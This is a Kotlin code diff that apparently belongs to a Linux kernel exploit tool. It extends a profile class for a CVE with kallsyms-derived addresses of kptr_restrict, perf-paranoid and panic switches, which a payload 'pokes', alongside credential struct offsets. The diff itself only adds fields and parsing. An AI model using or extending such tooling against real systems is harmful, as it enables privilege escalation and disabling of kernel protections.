@@ -44,6 +44,15 @@ data class Cve98260Profile(
     val credOffUserNs: Long,
     val credOffUcounts: Long,
     val credOffGroups: Long,
+    /**
+     * Link-time addresses of the two `--poke` switches. They come from the same kallsyms pass as
+     * the rest of the profile, so a custom build no longer needs the 6.1.134 constants baked into
+     * the payload. Zero means "this profile predates the fields" and the payload falls back to its
+     * built-in table with a warning.
+     */
+    val kptrLink: Long = 0,
+    val paranoidLink: Long = 0,
+    val panicLink: Long = 0,
 ) {
 
     /**
@@ -65,6 +74,9 @@ data class Cve98260Profile(
         appendLine("    groups = ${hex(groups)}")
         appendLine("    ucounts = ${hex(ucounts)}")
         appendLine("    task_alloc_link = ${hex(taskAllocLink)}")
+        appendLine("    kptr_link = ${hex(kptrLink)}")
+        appendLine("    paranoid_link = ${hex(paranoidLink)}")
+        appendLine("    panic_link = ${hex(panicLink)}")
         appendLine("    task_cred = $taskCred")
         appendLine("    task_struct_size = $taskStructSize")
         appendLine("    kitimer_node = $kitimerNode")
@@ -145,6 +157,9 @@ data class Cve98260Profile(
                 groups = groups,
                 ucounts = ucounts,
                 taskAllocLink = long("task_alloc_link") ?: 0,
+                kptrLink = long("kptr_link") ?: 0,
+                paranoidLink = long("paranoid_link") ?: 0,
+                panicLink = long("panic_link") ?: 0,
                 taskCred = taskCred,
                 taskStructSize = taskStructSize,
                 kitimerNode = kitimerNode,
